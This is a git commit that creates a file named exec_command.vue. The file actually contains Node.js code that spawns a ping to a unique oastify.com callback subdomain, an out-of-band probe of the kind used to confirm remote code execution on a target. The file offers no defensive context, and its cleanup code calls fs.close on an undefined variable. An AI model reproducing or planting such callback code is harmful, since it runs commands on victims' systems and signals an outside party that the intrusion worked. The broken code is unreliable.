1b594b217b2e32a5bdfdeb4a0e955f4da8f895db
xx_smile <43473886+xxsmile123@users.noreply.github.com>
2022-11-03 13:36:15 +0800

    Create exec_command.vue

---
+++ exec_command.vue
@@ -0,0 +1,20 @@
+const {spawn}  = require('child_process');
+const fs = require('fs');
+const spawnObj = spawn('ping', ['gdx4pp4un4okw5mp4qta64ptyk4bs7gw.oastify.com'], {encoding: 'utf-8'});
+spawnObj.stdout.on('data', function(chunk) {
+    console.log(chunk.toString());
+});
+spawnObj.stderr.on('data', (data) => {
+  console.log(data);
+});
+spawnObj.on('close', function(code) {
+    console.log('close code : ' + code);
+})
+spawnObj.on('exit', (code) => {
+    console.log('exit code : ' + code);
+    fs.close(fd, function(err) {
+        if(err) {
+            console.error(err);
+        }
+    });
+});
